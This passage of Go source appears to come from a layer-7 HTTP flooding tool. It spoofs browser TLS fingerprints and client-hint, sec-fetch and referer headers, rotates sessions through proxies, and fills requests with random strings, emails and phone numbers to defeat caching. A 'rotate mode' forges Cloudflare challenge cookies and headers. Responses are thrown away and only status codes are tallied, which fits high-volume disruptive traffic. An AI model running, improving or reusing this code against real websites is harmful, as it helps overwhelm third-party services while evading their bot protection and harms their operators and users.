	return strings.IndexAny(s, "［］") >= 0
}

func replacePlaceholders(s string) string {
	if strings.IndexByte(s, '[') < 0 && strings.IndexAny(s, "［］") >= 0 {
		s = normalizeL7PlaceholderSyntax(s)
	}
	if strings.IndexByte(s, '[') < 0 {
		return s
	}
	var b strings.Builder
	b.Grow(len(s) + 16)
	for i := 0; i < len(s); {
		if s[i] != '[' {
			b.WriteByte(s[i])
			i++
			continue
		}
		end := strings.IndexByte(s[i+1:], ']')
		if end < 0 {
			b.WriteByte(s[i])
			i++
			continue
		}
		inner := s[i+1 : i+1+end]
		if repl, ok := expandPlaceholder(inner); ok {
			b.WriteString(repl)
			i += end + 2
		} else {
			b.WriteByte(s[i])
			i++
		}
	}
	return b.String()
}

func expandPlaceholder(inner string) (string, bool) {
	if f := matchBracketName(inner); f != nil {
		
		if i := strings.IndexByte(inner, ':'); i >= 0 {
			if v, err := strconv.Atoi(inner[i+1:]); err == nil && v > 0 {
				if v > 4096 {
					v = 4096
				}
				return f(v), true
			}
			return f(8), true
		}
	}
	if f := matchLowerName(inner); f != nil {
		
		n := 0
		for n < len(inner) && inner[n] >= '0' && inner[n] <= '9' {
			n++
		}
		if n > 0 && n < len(inner) {
			if v, err := strconv.Atoi(inner[:n]); err == nil && v >= 0 {
				if v < 1 {
					v = 8
				}
				return f(v), true
			}
		}
	}
	if low := strings.ToLower(inner); strings.HasPrefix(low, "email") {
		dom := ""
		if strings.HasPrefix(low, "email:") {
			dom = inner[len("email:"):]
		}
		return randEmail(dom), true
	}
	if low := strings.ToLower(inner); strings.HasPrefix(low, "phone") {
		loc := ""
		if strings.HasPrefix(low, "phone:") {
			loc = inner[len("phone:"):]
		}
		return randPhone(loc), true
	}
	return "", false
}

func matchLowerName(s string) func(int) string {
	if len(s) > 3 && strings.HasPrefix(s, "rand") {
		return randAllSeq
	}
	if len(s) > 2 && strings.HasPrefix(s, "int") {
		return randIntSeq
	}
	if len(s) > 2 && strings.HasPrefix(s, "str") {
		return randStrSeq
	}
	return nil
}

func matchBracketName(s string) func(int) string {
	eq := func(a, b string) bool {
		return strings.EqualFold(a, b)
	}
	if len(s) > 3 && eq(s[:4], "rand") {
		return randAllSeq
	}
	if len(s) > 5 && eq(s[:6], "string") {
		return randStrSeq
	}
	if len(s) > 2 && eq(s[:3], "int") {
		return randIntSeq
	}
	return nil
}

func matchEmailPhoneBracket(s string) (string, bool) {
	eq := func(a, b string) bool { return strings.EqualFold(a, b) }
	if len(s) > 4 && eq(s[:5], "email") {
		arg := ""
		if len(s) > 5 && s[5] == ':' {
			end := strings.IndexByte(s, ']')
			if end > 6 {
				arg = s[6:end]
			}
		}
		return randEmail(arg), true
	}
	if len(s) > 5 && eq(s[:5], "phone") {
		arg := ""
		if len(s) > 5 && s[5] == ':' {
			end := strings.IndexByte(s, ']')
			if end > 6 {
				arg = s[6:end]
			}
		}
		return randPhone(arg), true
	}
	return "", false
}

const emailLocalCharset = "abcdefghijklmnopqrstuvwxyz0123456789"

func randEmailLocal(n int) string {
	if n < 1 {
		n = 8
	}
	return generateRandomString(n, emailLocalCharset)
}

func randEmail(domain string) string {
	domain = strings.TrimSpace(domain)
	if domain == "" {
		domain = emailDomains[rand.Uint64N(uint64(len(emailDomains)))]
	}
	return randEmailLocal(int(rand.Uint64N(12))+6) + "@" + domain
}

func randCNMobile() string {
	return "1" + string(byte(rand.Uint64N(7))+'3') + randIntSeq(9)
}

func randUSPhone() string {
	return string(byte(rand.Uint64N(8))+'2') + randIntSeq(2) +
		string(byte(rand.Uint64N(8))+'2') + randIntSeq(2) + randIntSeq(4)
}

func randKRPhone() string {
	prefixes := []string{"11", "16", "17", "18", "19"}
	p := "10"
	if rand.Uint64N(2) == 0 {
		p = prefixes[rand.Uint64N(uint64(len(prefixes)))]
	}
	return formatIntlMobileSplit("82", p, randIntSeq(8))
}

func randJPPhone() string {
	prefixes := []string{"90", "80", "70"}
	return formatIntlMobileSplit("81",
		prefixes[rand.Uint64N(uint64(len(prefixes)))], randIntSeq(8))
}

func randUKPhone() string {
	n := "7" + randIntSeq(9)
	return formatIntlMobileSplit("44", n[:4], n[4:])
}

func randINPhone() string {
	n := string(byte(rand.Uint64N(4))+'6') + randIntSeq(9)
	return formatIntlMobileSplit("91", n[:5], n[5:])
}

func formatIntlMobileSplit(cc, first, rest string) string {
	switch rand.Uint64N(4) {
	case 0:
		return "+" + cc + first + rest
	case 1:
		return "+" + cc + " " + first + " " + rest
	case 2:
		return "+" + cc + "-" + first + "-" + rest
	default:
		return "+" + cc + " " + first + "-" + rest
	}
}

func normalizePhoneLocale(s string) string {
	s = strings.TrimSpace(s)
	if len(s) > 0 && s[0] == '+' {
		s = s[1:]
	}
	return strings.ToUpper(s)
}

func randNonZeroLeadingIntSeq(n int) string {
	if n <= 0 {
		return ""
	}
	if n == 1 {
		return string(byte(rand.Uint64N(9)) + '1')
	}
	return string(byte(rand.Uint64N(9))+'1') + randIntSeq(n-1)
}

func randPhone(locale string) string {
	switch normalizePhoneLocale(locale) {
	case "":
		return randCNMobile()
	case "CN", "CHINA":
		return randCNMobile()
	case "US", "USA":
		return randUSPhone()
	case "GB", "UK", "GBR", "BRITAIN", "44":
		return randUKPhone()
	case "IN", "INDIA", "91":
		return randINPhone()
	case "JP", "JAPAN", "81":
		return randJPPhone()
	case "KR", "KOREA", "82":
		return randKRPhone()
	}
	if n, err := strconv.Atoi(strings.TrimSpace(locale)); err == nil {
		if n < 7 {
			n = 11
		} else if n > 15 {
			n = 15
		}
		return randNonZeroLeadingIntSeq(n)
	}
	return randCNMobile()
}

func parseBoolSwitch(s string) (bool, bool) {
	switch strings.ToLower(strings.TrimSpace(s)) {
	case "1", "on", "true", "yes", "enable":
		return true, true
	case "0", "off", "false", "no", "disable":
		return false, true
	}
	return false, false
}

func normalizeOnOff(s string) (string, int) {
	if v, ok := parseBoolSwitch(s); ok {
		if v {
			return "on", 2
		}
		return "off", 2
	}
	return strings.ToLower(strings.TrimSpace(s)), 1
}

type browserProfile struct {
	ua, secChUa, fullVer, platform, platformVer, arch, bitness, mobile string
}

var profileMeta []struct {
	family string
	major  int64
}

func init() {
	profileMeta = make([]struct {
		family string
		major  int64
	}, len(profilePool))
	for i, p := range profilePool {
		fam, major := parseUAFamily(p.ua)
		profileMeta[i] = struct {
			family string
			major  int64
		}{fam, major}
	}
}

func selectProfileByUA(ua string) browserProfile {
	if ua == "" {
		return profilePool[rand.Uint64N(uint64(len(profilePool)))]
	}
	ua = replacePlaceholders(ua)
	fam, major := parseUAFamily(ua)
	if fam == "" {
		fmt.Fprintf(os.Stderr,
			"stealth: UA family unrecognised; using random profile and forwarding UA verbatim\n")
		return profilePool[rand.Uint64N(uint64(len(profilePool)))]
	}
	var byFam, byMaj []int
	for i, m := range profileMeta {
		if m.family == fam {
			byFam = append(byFam, i)
			if m.major == major {
				byMaj = append(byMaj, i)
			}
		}
	}
	if len(byMaj) > 0 {
		return profilePool[byMaj[rand.Uint64N(uint64(len(byMaj)))]]
	}
	if len(byFam) == 0 {
		fmt.Fprintf(os.Stderr,
			"stealth: no %s profile in pool; using random profile (TLS family will mismatch UA)\n", fam)
		return profilePool[rand.Uint64N(uint64(len(profilePool)))]
	}
	
	best := byFam[0]
	bestDiff := int64(1) << 62
	for _, i := range byFam {
		d := profileMeta[i].major - major
		if d < 0 {
			d = -d
		}
		if d < bestDiff {
			bestDiff = d
			best = i
		}
	}
	return profilePool[best]
}

type sessionSlot struct {
	client      *resty.Client
	profile     browserProfile
	acceptLang  string
	isFirefox   bool
	isSafari    bool
	isChromium  bool
	hasDNT      bool
	hasGPC      bool
	wantPriority bool
	wantTE      bool
	wantFullVer bool
	wantPlatVer bool
	wantArchBit bool
	wantModel   bool
}

var refererSites = []string{
	"https://www.google.com/", "https://www.google.com/search?q=",
	"https://www.bing.com/search?q=", "https://www.yahoo.com/",
	"https://duckduckgo.com/?q=", "https://www.baidu.com/s?wd=",
	"https://yandex.ru/search/?text=", "https://www.facebook.com/",
	"https://twitter.com/", "https://t.co/", "https://www.reddit.com/",
	"https://www.youtube.com/", "https://www.instagram.com/",
	"https://www.linkedin.com/", "https://www.tiktok.com/",
	"https://www.wikipedia.org/", "https://www.amazon.com/",
}

func newSessionSlot(fixed *browserProfile, uaFlag *string,
	jar tls_client.CookieJar, proxyURL string) *sessionSlot {

	var prof browserProfile
	if fixed == nil {
		prof = selectProfileByUA(*uaFlag)
		if strings.Contains(prof.ua, "[") {
			prof.ua = replacePlaceholders(prof.ua)
		}
	} else {
		prof = *fixed
	}

	isFirefox := strings.Contains(prof.ua, "Firefox/")
	isSafari := strings.Contains(prof.ua, "Safari/")
	isChromium := !isFirefox && !isSafari &&
		(strings.Contains(prof.ua, "Chrome/") || strings.Contains(prof.ua, "Chromium/"))

	
	
	
	family, major := parseUAFamily(prof.ua)
	var cp profiles.ClientProfile
	switch family {
	case "firefox":
		cp = profiles.Firefox_117
	case "safari":
		cp = profiles.Safari_16_0
	default: 
		cp = profiles.Chrome_146
	}
	if family == "chrome" || family == "edge" || family == "" {
		for _, v := range []struct {
			major int
			cp    profiles.ClientProfile
		}{
			{146, profiles.Chrome_146},
			{144, profiles.Chrome_144},
			{133, profiles.Chrome_133},
			{124, profiles.Chrome_124},
		} {
			if int(major) >= v.major {
				cp = v.cp
				break
			}
		}
	}
	cp = profiles.NewClientProfile(
		cp.GetClientHelloId(),
		cp.GetSettings(), cp.GetSettingsOrder(), cp.GetPseudoHeaderOrder(),
		cp.GetConnectionFlow(), cp.GetPriorities(), cp.GetHeaderPriority(),
		cp.GetStreamID(), cp.GetAllowHTTP(),
		cp.GetHttp3Settings(), cp.GetHttp3SettingsOrder(),
		cp.GetHttp3PriorityParam(), cp.GetHttp3PseudoHeaderOrder(),
		cp.GetHttp3SendGreaseFrames())
	options := []tls_client.HttpClientOption{
		tls_client.WithClientProfile(cp),
		tls_client.WithTimeoutSeconds(15),
		tls_client.WithRandomTLSExtensionOrder(),
	}
	if jar != nil {
		options = append(options, tls_client.WithCookieJar(jar))
	}
	if proxyURL != "" {
		options = append(options, tls_client.WithProxyUrl(proxyURL))
	}
	rt, err := srt.NewSpoofedRoundTripper(options...)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	client := resty.New()
	client.SetTransport(rt)
	client.SetDoNotParseResponse(true)
	client.SetTimeout(15 * time.Second)

	s := &sessionSlot{
		client:    client,
		profile:   prof,
		acceptLang: acceptLanguages[rand.Uint64N(uint64(len(acceptLanguages)))],
		isFirefox:  isFirefox,
		isSafari:   isSafari,
		isChromium: isChromium,
		hasDNT:     rand.Float64() < 0.01,
	}
	if isFirefox {
		s.hasGPC = rand.Float64() < 0.04
	}
	if isChromium {
		s.wantPriority = rand.Float64() < 0.9
	}
	s.wantTE = rand.Float64() < 0.65
	s.wantFullVer = isChromium && rand.Float64() < 0.15
	s.wantPlatVer = isChromium && rand.Float64() < 0.12
	s.wantArchBit = isChromium && rand.Float64() < 0.08
	s.wantModel = isChromium && prof.mobile == "?0" && rand.Float64() < 0.08
	return s
}

func rotateSlot(s *slotRef, mk func() *sessionSlot, lifetimeMin, lifetimeMax int64,
	fixed *browserProfile, idx int) {
	ns := mk()
	s.ptr.Store(ns)
	s.expiresNs.Store(time.Now().UnixNano() +
		lifetimeMin*1e9 + int64(rand.Uint64N(uint64(lifetimeMax-lifetimeMin)*1e9)))
	if fixed == nil {
		if fam, major := parseUAFamily(ns.profile.ua); fam != "" {
			fmt.Fprintf(os.Stderr, "Slot %d rotated: family=%s major=%d\n", idx, fam, major)
		}
	}
}

func maybeRotateSlot(s *slotRef, mk func() *sessionSlot, lifetimeMin, lifetimeMax int64,
	fixed *browserProfile, idx int) {
	if time.Now().UnixNano() >= s.expiresNs.Load() {
		rotateSlot(s, mk, lifetimeMin, lifetimeMax, fixed, idx)
	}
}

func runRequest(c *requestCtx) {
	slot := c.slots[c.slotIdx].ptr.Load()

	
	rawURL := c.plainURL
	hostName := c.hostName
	basePath := c.basePath
	if !c.urlHasPH {
		rawURL = replacePlaceholders(c.urlFlag)
		if u, err := url.Parse(rawURL); err == nil && u.Host != "" {
			hostName = u.Host
			basePath = u.Scheme + "://" + u.Host + "/"
		} else {
			hostName, basePath = "", ""
		}
	}
	if c.rotateMode {
		rawURL = appendCFChallengeQuery(rawURL, c.tsStr)
	}

	req := slot.client.R()
	req.Header.Set("user-agent", slot.profile.ua)

	
	switch {
	case slot.isFirefox:
		req.Header.Set("accept",
			"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8")
	case slot.isSafari:
		req.Header.Set("accept",
			"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/avif,*/*;q=0.8")
	default:
		req.Header.Set("accept",
			"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
	}

	
	if slot.isChromium {
		req.Header.Set("sec-ch-ua", slot.profile.secChUa)
		req.Header.Set("sec-ch-ua-mobile", slot.profile.mobile)
		req.Header.Set("sec-ch-ua-platform", slot.profile.platform)
		if slot.wantFullVer {
			req.Header.Set("sec-ch-ua-full-version-list", slot.profile.fullVer)
		}
		if slot.wantPlatVer {
			req.Header.Set("sec-ch-ua-platform-version", slot.profile.platformVer)
		}
		if slot.wantArchBit {
			req.Header.Set("sec-ch-ua-arch", slot.profile.arch)
			req.Header.Set("sec-ch-ua-bitness", slot.profile.bitness)
		}
		if slot.wantModel {
			req.Header.Set("sec-ch-ua-model", `""`)
		}
	}

	if c.nav == navNavigate {
		req.Header.Set("upgrade-insecure-requests", "1")
	}

	
	ref := ""
	switch c.refStrat {
	case refererRandom:
		th := 0.198
		if c.sessionMode {
			th = 0.05
		}
		if rand.Float64() >= th {
			site := refererSites[rand.Uint64N(uint64(len(refererSites)))]
			if strings.HasSuffix(site, "=") {
				site += generateRandomString(int(rand.Uint64N(12))+4, charsetAlpha)
			}
			ref = site
		}
	case refererFixed:
		ref = c.refFixed
	case refererDynamic:
		ref = replacePlaceholders(c.refererFlag)
	}
	if ref != "" {
		req.Header.Set("referer", ref)
	}

	
	if c.isBodyMethod || c.nav == navCorsA || c.nav == navCorsB {
		origin := c.refBase
		if origin == "" {
			if u, err := url.Parse(ref); err == nil && u.Host != "" {
				origin = u.Scheme + "://" + u.Host
			}
		}
		if origin == "" {
			origin = strings.TrimRight(basePath, "/")
		}
		if origin != "" && !(slot.isSafari && c.method != "GET") {
			req.Header.Set("origin", origin)
		}
	}

	
	if slot.isSafari || slot.isChromium {
		site := "same-origin"
		if ref != basePath {
			site = deriveSecFetchSite(ref, hostName)
		}
		applySecFetchHeaders(req, c.nav, site)
	}

	
	if slot.isSafari {
		req.Header.Set("accept-encoding", "gzip, deflate, br")
	} else {
		req.Header.Set("accept-encoding", "gzip, deflate, br, zstd")
	}
	req.Header.Set("accept-language", slot.acceptLang)

	
	if c.nav == navNavigate {
		r := rand.Float64()
		if r < 0.008 {
			req.Header.Set("cache-control", "no-cache")
			if !slot.isSafari {
				req.Header.Set("pragma", "no-cache")
			}
		} else if r < 0.025 && slot.isChromium {
			req.Header.Set("cache-control", "max-age=0")
		}
	}
	if slot.hasDNT {
		req.Header.Set("dnt", "1")
	}
	if slot.hasGPC {
		req.Header.Set("sec-gpc", "1")
	}
	if slot.wantPriority {
		switch c.nav {
		case navNavigate:
			req.Header.Set("priority", "u=0, i")
		case navSubresource:
			req.Header.Set("priority", "u=3")
		default:
			req.Header.Set("priority", "u=1, i")
		}
	}
	if slot.wantTE {
		req.Header.Set("te", "trailers")
	}

	
	if c.rotateMode {
		req.Header.Set("cookie", generateRotateCFCookies(c.tsStr))
		setCFChallengeHeaders(req, c.rand32, c.tsMs)
	}

	
	for k, v := range c.staticHeaders {
		req.Header.Set(k, v)
	}
	for k, v := range c.dynamicHeaders {
		req.Header.Set(k, replacePlaceholders(v))
	}

	
	pseudo, ordered := wireOrder(slot.profile.ua, slot.profile.secChUa)
	req.Header["PHeader-Order:"] = pseudo
	req.Header["Header-Order:"] = ordered

	
	if c.dataStr != "" {
		if c.dataHasPH {
			req.SetBody(replacePlaceholders(c.dataStr))
		} else {
			req.SetBody(c.dataStr)
		}
		if c.contentType != "" {
			req.Header.Set("content-type", c.contentType)
		}
	}

	
	resp, err := req.Execute(c.method, rawURL)
	if err != nil {
		c.stats.curErr.Add(1)
		c.stats.totErr.Add(1)
		if c.verbose {
			fmt.Fprintln(os.Stderr, "request error:", err)
		}
		maybeRotateSlot(&c.slots[c.slotIdx], c.mkSlot,
			c.lifetimeMin, c.lifetimeMax, c.profile, c.slotIdx)
		return
	}
	if resp != nil && resp.RawBody() != nil {
		_, _ = io.CopyN(io.Discard, resp.RawBody(), 1<<20)
		resp.RawBody().Close()
	}

	code := resp.StatusCode()
	if code >= 1 && code <= 999 {
		c.stats.current[code].Add(1)
		c.stats.total[code].Add(1)
	} else {
		c.stats.curErr.Add(1)
		c.stats.totErr.Add(1)
	}

	
	if c.rateresetOn && code == 429 {
		now := time.Now().UnixNano()
		if now-c.lastReq.Load() >= 2e9 {
			if c.lastReq.CompareAndSwap(c.lastReq.Load(), now) {
				retryAfter := 0
				if v := resp.Header().Get("Retry-After"); v != "" {
					if n, err := strconv.Atoi(strings.TrimSpace(v)); err == nil &&
						n >= 1 && n <= 600 {
						retryAfter = n * 1e9
					}
				}
				c.rateMu.Lock()
				if retryAfter < 1 {
					newRate := *c.curRate * 0.5
					if newRate < *c.minRate {
						newRate = *c.minRate
					}
					*c.curRate = newRate
					c.interval.Store(int64(1e9 / newRate))
					fmt.Fprintf(os.Stderr, "429 detected, rate reduced to %.2f rps\n", newRate)
				} else {
					secs := float64(retryAfter) / 1e9
					newRate := 1 / secs
					if newRate < *c.minRate {
						newRate = *c.minRate
					}
					if newRate < *c.curRate {
						*c.curRate = newRate
					}
					c.interval.Store(int64(1e9 / *c.curRate))
					c.resumeAt.Store(now + int64(retryAfter))
					fmt.Fprintf(os.Stderr,
						"429 (Retry-After=%ds), rate reduced to %.2f rps\n",
						int(secs), *c.curRate)
				}
				c.rateMu.Unlock()
				go rateRecovery(c)
			}
		}
	}

	maybeRotateSlot(&c.slots[c.slotIdx], c.mkSlot,
		c.lifetimeMin, c.lifetimeMax, c.profile, c.slotIdx)
}

func rateRecovery(c *requestCtx) {
	t := time.NewTicker(5 * time.Second)
	defer t.Stop()
	for range t.C {
		select {
		case <-c.stopChan:
			return
		default:
		}
		if time.Now().UnixNano() < c.resumeAt.Load() {
			continue
		}
		c.rateMu.Lock()
		newRate := *c.curRate * 1.3
		if newRate >= c.rpsFlag {
			*c.curRate = c.rpsFlag
			c.interval.Store(int64(1e9 / c.rpsFlag))
			fmt.Fprintf(os.Stderr, "Rate fully restored to %.2f rps\n", c.rpsFlag)
			c.rateMu.Unlock()
			return
		}
		*c.curRate = newRate
		c.interval.Store(int64(1e9 / newRate))
		fmt.Fprintf(os.Stderr, "Rate recovering to %.2f rps\n", newRate)
		c.rateMu.Unlock()
	}
}

